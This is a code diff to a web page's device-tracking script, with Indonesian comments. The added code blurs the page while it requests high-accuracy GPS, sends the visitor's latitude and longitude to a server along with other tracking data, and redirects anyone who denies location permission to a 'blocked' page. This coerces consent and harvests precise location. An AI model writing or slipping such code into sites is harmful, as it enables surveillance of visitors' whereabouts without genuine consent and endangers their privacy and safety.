@@ -365,25 +365,36 @@ function initDeviceTracking() {
         // Dapatkan lokasi GPS jika diizinkan
         if (navigator.geolocation) {
             try {
+                document.body.classList.add('geo-blur');
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
+                        document.body.classList.remove('geo-blur');
                         baseRequest.then(() => sendDataToServer({
                             ...payload,
                             lat: pos.coords.latitude,
                             long: pos.coords.longitude
                         }));
                     },
-                    () => {},
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 }
+                    (error) => {
+                        document.body.classList.remove('geo-blur');
+                        if (error.code === error.PERMISSION_DENIED) {
+                            window.location.href = 'blocked.html';
+                        }
+                    },
+                    { enableHighAccuracy: true, maximumAge: 60000 }
                 );
-            } catch { /* Base tracking does not depend on GPS permission or availability. */ }
+            } catch { 
+                document.body.classList.remove('geo-blur');
+            }
         }
     }
 
     // ============================================================
     // Mulai saat DOM siap, tanpa menunggu gambar, font, atau pergantian bahasa.
     // ============================================================
-    startTracker();
+    if (!window.location.pathname.includes("blocked.html")) {
+        startTracker();
+    }
 }
 
 
